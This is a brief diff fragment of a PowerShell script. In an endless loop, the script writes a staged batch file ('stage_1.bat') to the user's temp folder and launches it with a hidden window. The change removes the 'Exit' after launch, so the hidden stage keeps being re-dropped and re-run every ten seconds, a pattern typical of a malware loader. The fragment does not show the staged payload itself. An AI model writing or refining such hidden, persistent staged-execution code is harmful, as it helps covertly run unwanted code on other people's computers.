@@ -44,7 +44,7 @@ while($true)
    else{
           Out-File -FilePath "$env:temp/stage_1.bat" -InputObject $stage1 -Encoding ASCII
           Start-Process -WindowStyle Hidden "$env:temp/stage_1.bat" 
-       Exit
+       
    }
    Start-Sleep 10
 }
